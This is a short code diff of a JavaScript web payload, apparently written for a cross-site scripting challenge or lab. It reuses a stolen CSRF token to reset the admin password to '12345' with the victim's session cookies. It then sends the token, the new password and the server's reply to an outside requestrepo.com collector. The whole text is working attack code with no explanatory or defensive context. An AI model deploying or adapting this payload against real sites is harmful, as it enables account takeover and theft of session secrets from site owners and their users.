@@ -11,15 +11,21 @@
   const token = m[1];
   const pw = "12345";
 
-  new Image().src =
+  const change = await fetch(
     "/changepw?userid=admin&userpw=" +
-    encodeURIComponent(pw) +
-    "&csrf_token=" +
-    encodeURIComponent(token);
+      encodeURIComponent(pw) +
+      "&csrf_token=" +
+      encodeURIComponent(token),
+    { credentials: "include" }
+  );
+
+  const result = await change.text();
 
   new Image().src =
     "https://4w8vxje0.requestrepo.com/?token=" +
     encodeURIComponent(token) +
     "&pw=" +
-    encodeURIComponent(pw);
+    encodeURIComponent(pw) +
+    "&result=" +
+    encodeURIComponent(result);
 })();
